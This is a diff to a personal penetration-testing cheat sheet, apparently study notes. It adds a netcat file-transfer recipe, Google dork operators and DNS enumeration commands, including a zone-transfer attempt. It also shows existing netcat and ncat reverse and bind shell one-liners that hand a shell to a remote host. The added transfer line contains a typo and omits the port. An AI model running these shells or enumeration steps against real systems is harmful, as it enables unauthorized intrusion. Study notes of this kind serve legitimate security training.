@@ -17,11 +17,13 @@ Kali              nc -nv 192.168.2.12 4444
 # Reverse shell
 Windows           nc -nlvp 4444
 Kali              nc -nv 192.168.2.12 4444 -e /bin/bash
+
+# Transfer file
+Windows           nc -nlvp 4444 > incoming.exe
+Kali              nc -nv 192.168.2.12 < /usr/share/windows-binnaries/wget.exe
 ------------------------------------------------------------------------------------------------------
 
 # Ncat is part of the nmap package.
-
-Files needed for Windows 7: ncat.exe, libeay32.dll, ssleay32.dll
 
 # Bind shell
 Windows           ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
@@ -54,11 +56,20 @@ tcpdump -nX -r <capture.pcap>                          # Read the file and dump 
 # Google Hacking
 
 site:target.com                                        # Approximate web presence of an organization
-site:target.com -site:www.target.com                   # Subdomains that may exist
-filetype
-inurl
-intitle
+site:target.com -site:www.target.com                   # Locate Subdomains
+filetype:pdf					       # Locate all pdf files
+intitle:
+inurl:
 ------------------------------------------------------------------------------------------------------
+
+# DNS
+
+host -t <type> target.com				# Enumeration
+	mx = mail server
+	ns = name server
+
+host -l target.com <DNS server>				# Zone transfer
+
 
 # debug.exe
 
